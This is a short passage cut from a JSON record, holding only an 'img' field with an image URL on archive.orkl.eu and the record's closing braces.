        "img": "https://archive.orkl.eu/b28282399c81df4a85cba432db0b9f579273e6d7.jpg"
    }
}